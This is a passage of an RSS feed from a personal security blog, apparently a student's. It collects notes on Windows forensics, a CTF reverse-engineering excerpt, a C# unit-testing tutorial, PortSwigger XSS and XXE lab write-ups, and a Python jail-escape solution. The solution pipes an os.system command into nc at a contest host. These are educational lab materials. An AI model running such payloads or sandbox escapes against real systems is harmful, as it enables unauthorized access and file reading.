c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group3\07 - Event Viewer.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group3\08 - PowerAndSleep.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group3\09 - Mobility Center.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group3\10 - AppsAndFeatures.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Chromium.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\File Shredder.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Google Chrome.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Microsoft Edge.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Oracle VM VirtualBox.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Window Switcher.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\AnyDesk.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Discord.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Excel.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\File Explorer.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Firefox.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\LINE (2).lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\PowerPoint.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Sublime Text 3.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Task Manager.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\The Interactive Disassembler (2).lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\The Interactive Disassembler.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Visual Studio Code.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\VMware Workstation Pro.lnk c:\Users\Bernie\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Word.lnk c:\Users\Bernie\Desktop\Test-Dragon.lnk c:\Users\Bernie\Links\Desktop.lnk c:\Users\Bernie\Links\Downloads.lnk c:\Users\Bernie\OneDrive\Personal Vault.lnk ::: Lab 可以先到這邊下載lnk_parser_cmd.exe</description></item><item><title>TaiwanHolyHigh - Windows Forensics - Windows Artifacts</title><link>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows-artifacts/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows-artifacts/index.html</guid><description>TaiwanHolyHigh - Windows Forensics - Windows Artifacts [TOC]
:::info 以下引用若無特別說明皆來自於講師的上課簡報 :::
Artifacts Background 使用者操作 Windows 作業系統時會在系統中留下或產生許多行為紀錄，稱之為 Artifacts
Artifacts種類 特定路徑或資料夾: Program Files/Program Data Download Temp$\to$這在玩分析memory中很常出現 電腦特定檔案: LNK Email$\to$這在玩分析memory中也很常出現 系統還原檔(VSS, volume shadow copy): 站在藍隊的角度可以藉此知道受害者的遭到入侵的一些證據；站在紅隊的角度可以藉此撈到一些受害者的基敏資料 Artifacts分析面向 檔案Metadata: Timestamp(一般檔案的MAC time至少有兩個, Modify/Access/Create Time)可以藉此知道檔案的異動時間 應用程式: 記憶體: volatility可以針對某個PID dump出執行該process的memory，也是常見的技巧 Prefetch File 一般位於C槽windows文件夾下（C:\Windows\Prefetch），主要是用來存放系統已訪問的文件預讀信息；一開始創建此文件夾主要是為了加快系統的啟動過程。
使用者的操作行為 Audit(AD很常碰到的event ID: 4662…) Volatility的console可以看到駭客的command Volatility的malfind可以看到惡意注入的payload… 網路行為 Volatility的netscan Most Recently Used(MRU) Background 就是泛指各種windows存取使用者最近access過的檔案、路徑或網路位置，是一種行為，攻防兩端都會注意的地方
Overview 攻擊者會留下的足跡: .lnk, Jump List, User Assist Registry, Prefetch，如果攻擊者想要植入惡意程式，鑑識可以從以上四個地方看出這個intention Jump List就有點像是一個shortcut，可以跳到某個地方執行或開啟something</description></item><item><title>TaiwanHolyHigh - Windows Forensics - Windows檔案系統與還原</title><link>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows%E6%AA%94%E6%A1%88%E7%B3%BB%E7%B5%B1%E8%88%87%E9%82%84%E5%8E%9F/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows%E6%AA%94%E6%A1%88%E7%B3%BB%E7%B5%B1%E8%88%87%E9%82%84%E5%8E%9F/index.html</guid><description>TaiwanHolyHigh - Windows Forensics - Windows檔案系統與還原 :::spoiler TOC [TOC] :::
Background What is cluster or sector?
基本磁碟結構 磁碟儲存最小單位為sector，每一個sector包含了512bytes的資訊內容。但用sector當單位來儲存效率會很差，一般不會以一個sector當作存取檔案的單位，而是以cluster為一基本檔案單位，每一個cluster是架構在sector的2次方倍數上。假定連續的8個sector所構成一個cluster，其大小就為512×8=4096bytes(4K)，如此在存取資料時會以8個sector連續讀取而提升了相對效率。但並不是讓單位cluster越大越好，因為cluster越大相對的可能會浪費許多磁碟空間，例如設定以4K為一個cluster而要儲存的檔案內容只有1K，但這個小檔案還是佔用掉一個cluster的空間，其他3K就浪費掉了。所在考慮cluster的規劃時，需要同時考慮到檔案讀取的效能與檔案大小是否會浪費硬碟空間。
File Slack 舉例來說如果一個檔案A，大小是4個sector(2048 bytes)，現在將其刪除後又存入一個檔案B在同一位置，但其大小只有1.5個sector(768 bytes)，則後面沒有被填滿的2.5個sector事實上還殘留檔案A的一些資訊，尚未填滿的該sector(Ram Slack)+完整的兩個sector(Disk/Residual Slack)就是file slack
會有一點小複雜，反正file slack就是一個完整cluster(如果按照中FAT16來格式化128MB來說就是4個sectors)沒有被填滿的部分就對了，而ran slack或是disk(residual) slack只是在區分這些沒有被填滿的區塊而已
==比較表格==
稍微解釋一下為甚麼FAT16是單一cluster的sector數量比較多，因為按照他自己的定義，最大的cluster數量不能超過65526，也就是說如果硬碟的容量變大，單一cluster所除下來的sector數量就越多，舉例: 若一張記憶卡的大小是128MB$\to$134217728 bytes，單一cluster最少需要4個sectors $$ 134217728/512/65526\approx 4 $$ 所以如果記憶卡大小是512MB$\to$，536870912 bytes，單一cluster最少需要16個sectors $$ 536870912/512/65526\approx 16 $$ 當然，這樣的空間使用率是很差的，因為一個cluster就意味著一間總統套房，若所有的檔案不分大小都住進總統套房，就會造成很多浪費，或甚至是有很多file slack產生，試想如果像512MB一樣，一個cluster有16個sector，代表該總統套房可以容納$16*512=8192 bytes$，如果電腦中都是小檔案居多(1kB之類的)，那有很多空間就會浪費掉，但對於鑑識來說遺留的東西越多越能夠還原很多真相
以攻擊者或一般使用者來說，如何達到真正的毀屍滅跡?
Encryption: 工具veracrypt File Wipe: 工具file shredder Partition Wipe: 工具 Windows Format Fast: 快速格式化 Non-Fast: 完整格式化 差別就是 儲存檔案的時候， 除了在儲存區寫入檔案資料以外，也會在開頭一個小區塊的"檔案表"輸入相關資訊;快速格式化是只把開頭的檔案表重寫，真正儲存檔案資訊的部份則沒有更動，但是系統讀到檔案表顯示是"空白"，就會把這張片子當成是空片，就不管儲存區有沒有資料，直接覆蓋過去；換句話說，若是檔案表有標明某區存有某資料，則儲存時就會跳過這區不覆蓋 完整格式化會對格式化的區域進行讀寫測試，就是確定壞軌。快速格式化沒有</description></item><item><title>TSCCTF 2024</title><link>https://bernie6401.github.io/security/competition/tscctf-2024/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/tscctf-2024/index.html</guid><description>TSCCTF 2024 Misc AKA Source Code :::spoiler IDA
__int64 flag_function() { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND] num_of_files = 0; sub_14000A6C0(); here_dll = LoadLibraryA("here.dll"); flag_dll = LoadLibraryA("flag.dll"); ghost_dll = LoadLibraryA("ghost.dll"); strcpy(FileName, ".\\*.*"); FirstFileA = FindFirstFileA(FileName, &amp;FindFileData); while ( FindNextFileA(FirstFileA, &amp;FindFileData) ) { while ( *(_WORD *)FindFileData.cFileName != 46 &amp;&amp; (*(_WORD *)FindFileData.cFileName != 11822 || FindFileData.cFileName[2]) ) { num_of_files += (GetFileAttributesA(FindFileData.cFileName) &amp; 0x10) == 0; if ( !FindNextFileA(FirstFileA, &amp;FindFileData) ) goto LABEL_6; } } LABEL_6: FindClose(FirstFileA); if ( num_of_files > 2 ) { v6 = strcpy(buf, "We don't want too many files here."); puts(v6); v7 = strcpy(buf, "Files &lt;= 2. You have "); v8 = (char *)sub_140071880(v7, (unsigned int)num_of_files); v9 = strcpy(v8, " file(s)."); puts(v9); v10 = strcpy(buf, "Hint: Did you have short name?"); puts(v10); return 0i64; } if ( !here_dll ) { if ( !ghost_dll ) { if ( !flag_dll ) { v12 = strcpy(buf, "DLL load failed."); puts(v12); goto LABEL_12; } hint = (void (*)(void))GetProcAddress(flag_dll, "hint"); if ( !hint ) goto LABEL_12; goto LABEL_11; } goto LABEL_16; } if ( ghost_dll ) { LABEL_16: hint = (void (*)(void))GetProcAddress(ghost_dll, "Roflcopter"); if ( !hint ) goto LABEL_12; goto LABEL_11; } if ( !flag_dll ) { hint = (void (*)(void))GetProcAddress(here_dll, "hint"); if ( !hint ) { LABEL_12: FreeLibrary(here_dll); FreeLibrary(flag_dll); FreeLibrary(ghost_dll); return 0i64; } LABEL_11: hint(); goto LABEL_12; } flag = (void (*)(void))GetProcAddress(flag_dll, "flag"); if ( flag ) flag(); return 0i64; } :::</description></item><item><title>Unit Test Practice</title><link>https://bernie6401.github.io/security/course/ntu-st/unit-test-practice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-st/unit-test-practice/index.html</guid><description>Unit Test Practice tags: NTU_ST Software Testing :::spoiler Click to open TOC [TOC] :::
Install the environment Install Visual Studio with .NET that we can use C# language to implement unit test properly. Create a project to test Create a new project and choose C# as your language and named the project Bank. Rename Program.cs as BankAccount.cs and replace all content by the following code. using System; namespace BankAccountNS public class BankAccount { private readonly string m_customerName; private double m_balance; private BankAccount() { } public BankAccount(string customerName, double balance) { m_customerName = customerName; m_balance = balance; } public string CustomerName { get { return m_customerName; } } public double Balance { get { return m_balance; } } public void Debit(double amount) { if (amount > m_balance) { throw new ArgumentOutOfRangeException("amount"); } if (amount &lt; 0) { throw new ArgumentOutOfRangeException("amount"); } m_balance += amount; // intentionally incorrect code } public void Credit(double amount) { if (amount &lt; 0) { throw new ArgumentOutOfRangeException("amount"); } m_balance += amount; } public static void Main() { BankAccount ba = new BankAccount("Mr. Bryan Walton", 11.99); ba.Credit(5.77); ba.Debit(11.22); Console.WriteLine("Current balance is ${0}", ba.Balance); } } } Build it by clicking Build Solution in Build menu. Create a unit test project Create a new project at solution explorer and named it BankTests. The other part just maintain default setup. Select MSTest Test Project &lt;-This is important. Add reference by selecting Add Reference at BankTests/Dependencies In the Reference Manager dialog box, expand Projects, select Solution, and then check the Bank item. Create the test class Rename UnitTest1.cs to BankAccountTests.cs and replace the original code with the following section and add using statement at the top of the class file. using Microsoft.VisualStudio.TestTools.UnitTesting; namespace BankTests { [TestClass] public class BankAccountTests { [TestMethod] public void TestMethod1() { } } } BTW, the default class part can be ignored. Create the first test method Replace the default class with the following code [TestMethod] public void Debit_WithValidAmount_UpdatesBalance() { // Arrange double beginningBalance = 11.99; double debitAmount = 4.55; double expected = 7.44; BankAccount account = new BankAccount("Mr. Bryan Walton", beginningBalance); // Act account.Debit(debitAmount); // Assert double actual = account.Balance; Assert.AreEqual(expected, actual, 0.001, "Account not debited correctly"); } Analyze this part: Assert.AreEqual method will catch the exception when expected value unequal actual value or their difference larger than delta(0.001). Comparing with BankAccount.cs, the truly process of Debit function is $beginningBalance - debitAmount = expected$ -> $11.99 - 4.55 = 7.44$ Build and run the test On the Build menu, choose Build Solution (or press Ctrl + SHIFT + B) and press Ctrl + E, T to open Test Explorer, then Run All. You’ll find that all Test are failed, so you must modify somewhere incorrect. Fix your code and rerun your tests Return to BankAccount.cs and observe Debit() function. Must change m_balance += amount; to m_balance -= amount; Build and Run the code again and you’ll find the test is correct this time Create and run new test methods Add the following program in test class and rebuild it. [TestMethod] public void Debit_WhenAmountIsLessThanZero_ShouldThrowArgumentOutOfRange() { // Arrange double beginningBalance = 11.99; double debitAmount = -100.00; BankAccount account = new BankAccount("Mr. Bryan Walton", beginningBalance); // Act and assert Assert.ThrowsException&lt;System.ArgumentOutOfRangeException>(() => account.Debit(debitAmount)); } [TestMethod] public void Debit_WhenAmountIsMoreThanBalance_ShouldThrowArgumentOutOfRange() { // Arrange double beginningBalance = 11.99; double debitAmount = 200.00; BankAccount account = new BankAccount("Mr. Bryan Walton", beginningBalance); // Act and assert Assert.ThrowsException&lt;System.ArgumentOutOfRangeException>(() => account.Debit(debitAmount)); } Analyze: you’ll find out that the debitAmout in the 1st test method is less than zero and the debitAmount in 2nd test method is larger than beginningBalance. After runing test explorer, these 2 code block are working properly, but you don’t know what kind of exception is(amount > m_balance or amount &lt; 0), we just know somewhere throw back an exception message. Revise BankAccount.cs Trace back to BankAccount.Debit and you’ll notice that they used the same exception, so you can determine to use ArgumentOutOfRangeException(String, Object, String) to contain the name of the argument, the argument value, and a user-defined message. if (amount > m_balance) { throw new ArgumentOutOfRangeException("amount"); } if (amount &lt; 0) { throw new ArgumentOutOfRangeException("amount"); } Refactor the code under test Define 2 constants for the error message at class scope, put the following code block in the class under test, BankAccout. public const string DebitAmountExceedsBalanceMessage = "Debit amount exceeds balance"; public const string DebitAmountLessThanZeroMessage = "Debit amount is less than zero"; Then modify the 2 conditional statements in the Debit method. if (amount > m_balance) { throw new System.ArgumentOutOfRangeException("amount", amount, DebitAmountExceedsBalanceMessage); } if (amount &lt; 0) { throw new System.ArgumentOutOfRangeException("amount", amount, DebitAmountLessThanZeroMessage); } Refactor test method like this. Replacing Assert.ThrowsException with using try/catch method to catch unexpected exception situation. [TestMethod] public void Debit_WhenAmountIsMoreThanBalance_ShouldThrowArgumentOutOfRange() { // Arrange double beginningBalance = 11.99; double debitAmount = 20.0; BankAccount account = new BankAccount("Mr. Bryan Walton", beginningBalance); // Act try { account.Debit(debitAmount); } catch (System.ArgumentOutOfRangeException e) { // Assert StringAssert.Contains(e.Message, BankAccount.DebitAmountExceedsBalanceMessage); } } The last part Not really understatnd about adding Assert.Fail at the end of the test method. Final Result</description></item><item><title>XSS - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/xss---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/xss---apprentice/index.html</guid><description>XSS - APPRENTICE tags: Portswigger Web Security Academy Web [TOC]
Lab: Reflected XSS into HTML context with nothing encoded:zero: Description: This lab contains a simple reflected cross-site scripting vulnerability in the search functionality. Goal: To solve the lab, perform a cross-site scripting attack that calls the alert function. Exp Payload: &lt;script>alert(123)&lt;/script> :::spoiler Success Screenshot :::
Lab: Stored XSS into HTML context with nothing encoded Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality. Goal: To solve this lab, submit a comment that calls the alert function when the blog post is viewed. Exp You need to click into one post and comment something that contained script tag. Payload: &lt;script>alert(123)&lt;/script> :::spoiler Success Screenshot :::</description></item><item><title>XXE - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/index.html</guid><description>XXE - APPRENTICE tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input and returns any unexpected values in the response. Goal: To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. Lab: Exploiting XXE using external entities to retrieve files Recon Use Burp Suite to intercept package You can notice that it use a normal xml format. Exp - Inject Directly Exploit Payload:</description></item><item><title>神盾盃2023初賽</title><link>https://bernie6401.github.io/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/index.html</guid><description>神盾盃2023初賽 Jail1 Source code while True: ip = input("AEGIS> ") if 'hint' in ip.lower(): print(__import__('os').system('cat jail.py')) exit() try: if 'flag' in ip.lower(): print("Sorry, I don't like any \"FLAG\"!") continue print(eval(ip)) except Exception as error: print("ERROR:", error) print("Good luck next time!") pass Recon 應該是基本的jail escape，可以看到source code中擋掉了flag string，所以可以直接用萬用字元一樣畫葫蘆就拿到flag，水題中的水題
Exploit $ echo "print(__import__('os').system('cat fla*'))" | nc 35.234.20.42 8000 Flag: AEGIS{600d_j0b_70_byp455_fl46}
Jail2 Background SSTI
Source Code while True: ip = input("AEGIS> ") if 'hint' in ip.lower(): print(__import__('os').system('cat jail.py')) exit() try: print(eval(ip, {"__builtins__": {}}, {"__builtins__": {}})) except Exception as error: print("ERROR:", error) print("Good luck next time!") pass Recon 也是水題，既然block掉__builtins__ function，代表我們沒辦法使用print之類的function，但和前面的邏輯一樣，自己import就好</description></item></channel></rss>